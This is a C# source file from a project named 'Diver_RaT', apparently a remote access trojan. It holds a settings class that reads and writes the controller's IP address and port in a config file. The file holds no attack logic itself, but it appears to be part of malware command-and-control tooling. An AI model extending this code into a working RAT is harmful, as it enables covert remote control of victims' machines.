using System.IO;

namespace Diver_RaT
{
    public static class ControllerSettings
    {
        private static readonly string FilePath = Path.Combine(BuildEnvironment.Root, "controller.cfg");

        public static string Ip { get; private set; } = "";
        public static int Port { get; private set; } = Protocol.DefaultPort;

        static ControllerSettings() => Load();

        public static void Load()
        {
            try
            {
                if (!File.Exists(FilePath)) return;
                foreach (var raw in File.ReadAllLines(FilePath))
                {
                    var line = raw.Trim();
                    if (line.Length == 0 || line.StartsWith("#")) continue;
                    if (line.StartsWith("ip=", StringComparison.OrdinalIgnoreCase))
                        Ip = line.Substring(3).Trim();
                    else if (line.StartsWith("port=", StringComparison.OrdinalIgnoreCase))
                    {
                        if (int.TryParse(line.Substring(5).Trim(), out var p) && p is > 0 and < 65536)
                            Port = p;
                    }
                }
            }
            catch { }
        }

        public static void Save(string ip, int port)
        {
            Ip = ip ?? "";
            Port = port;
            try
            {
                Directory.CreateDirectory(BuildEnvironment.Root);
                File.WriteAllText(FilePath, $"ip={Ip}\r\nport={Port}\r\n");
            }
            catch { }
        }
    }
}